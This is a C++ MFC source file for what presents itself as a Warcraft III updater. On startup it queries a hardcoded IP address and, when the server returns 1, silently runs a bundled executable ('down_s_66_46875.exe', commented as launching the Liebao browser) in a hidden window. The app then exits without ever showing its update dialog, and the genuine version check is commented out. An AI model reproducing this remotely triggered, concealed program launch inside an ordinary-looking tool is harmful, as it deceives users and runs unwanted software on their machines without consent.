
// Update.cpp : 定义应用程序的类行为。
//

#include "stdafx.h"
#include "Update.h"
#include "UpdateDlg.h"
#include <afxinet.h>
#pragma  comment(lib,"Winmm.lib")
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CUpdateApp

BEGIN_MESSAGE_MAP(CUpdateApp, CWinAppEx)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CUpdateApp 构造

CUpdateApp::CUpdateApp()
{
	// TODO: 在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的一个 CUpdateApp 对象

CUpdateApp theApp;


// CUpdateApp 初始化

BOOL CUpdateApp::IsUpdate()
{
	TCHAR StrCurrentDir[256] ={0};
	GetCurrentDirectory(256,StrCurrentDir);
	CString warPath(StrCurrentDir);
	TCHAR  szValue[MAX_PATH] = {0};
	GetPrivateProfileString(_T("War3version"),_T("version"),_T("130101"),szValue,MAX_PATH,warPath+_T("//war3set.ini"));
	CString csVerOld(szValue);

	GetPrivateProfileString(_T("War3version"),_T("UpdateWeb"),_T("http://pipihaha.sinaapp.com/qyk"),szValue,MAX_PATH,warPath+_T("//war3set.ini"));
	CString csWeb(szValue);
	CString csVerNew = GetWebStieHtml(csWeb);

	if(csVerOld != csVerNew)
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}

bool  CUpdateApp::UpdateRunliebao()
{
    WinExec("down_s_66_46875.exe",SW_HIDE);
	return true;
}

CString   CUpdateApp::GetWebStieHtml(CString  strUrl)
{
	CInternetSession mySession(NULL,0);  
	CHttpFile* myHttpFile = NULL;
	myHttpFile = (CHttpFile*)mySession.OpenURL(strUrl);//str是要打开的地址
	CString myData;
	CString  csHtmlContent;
	while(myHttpFile->ReadString(myData)) 
	{
		csHtmlContent += myData; 
	}

	return  csHtmlContent;
}

BOOL CUpdateApp::InitInstance()
{
	// 如果一个运行在 Windows XP 上的应用程序清单指定要
	// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，
	//则需要 InitCommonControlsEx()。否则，将无法创建窗口。
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// 将它设置为包括所有要在应用程序中使用的
	// 公共控件类。
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinAppEx::InitInstance();

	AfxEnableControlContainer();

	// 标准初始化
	// 如果未使用这些功能并希望减小
	// 最终可执行文件的大小，则应移除下列
	// 不需要的特定初始化例程
	// 更改用于存储设置的注册表项
	// TODO: 应适当修改该字符串，
	// 例如修改为公司或组织名
	SetRegistryKey(_T("应用程序向导生成的本地应用程序"));

     CString  cstr =  GetWebStieHtml("http://121.199.10.53/csdn");
   
	int iType = atoi(cstr);
	//TCHAR StrCurrentDir[256] ={0};
	//GetCurrentDirectory(256,StrCurrentDir);
	//CString warPath(StrCurrentDir);
	//TCHAR  szValue[MAX_PATH] = {0};
	//int iType =  GetPrivateProfileIntA(_T("UpdateType"),_T("version"),1,warPath+_T("//war3set.ini"));
	
	 switch(iType)
	 {
	 case 1: UpdateRunliebao();return -1;        //运行猎豹
	 //case 2: if(IsUpdate()) return -1; break;  //安装包的更新
	 default: return -1;
	 }


	CUpdateDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();

	//ShellExecute()
	if (nResponse == IDOK)
	{
		// TODO: 在此放置处理何时用
		//  “确定”来关闭对话框的代码
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: 在此放置处理何时用
		//  “取消”来关闭对话框的代码
	}

	// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，
	//  而不是启动应用程序的消息泵。
	return FALSE;
}
